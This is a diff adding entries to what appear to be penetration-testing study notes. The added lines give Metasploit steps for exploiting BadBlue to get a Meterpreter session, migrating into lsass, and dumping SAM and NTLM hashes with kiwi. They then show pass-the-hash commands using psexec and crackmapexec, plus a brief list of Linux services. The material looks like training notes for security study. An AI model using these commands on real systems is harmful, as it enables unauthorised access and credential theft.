@@ -69,6 +69,27 @@ CVE-2019-0708
     - Use `show targets` for display targets systems -> `set target <number>`
     - Sometimes Windows system will crash during the exploit
 
+### Badblue
+- `search badblue`
+- use `bablue_passthru` -> Meterpreter
+- `pgrep lsass` -> `migrate <id>` -> check with `getuid`
+- `load kiwi`
+- `lsa_dump_sam` -> Get hash ntlm
+- `hash_dump` to get LM hash
+
+### Pass the hash
+- We can use the hash as password for modules `exploit/windows/smb/psexec`
+  - `set target` change target if needed.
+
+- `crackmapexec smb <target> -u <user> -H <NTLM_hash>` `-H` as HASH
+
+# Linux vulns
+
+- Apache server
+- SSH - 22
+- FTP - 21/23
+- SAMBA 445
+
 
 # Nessus
 
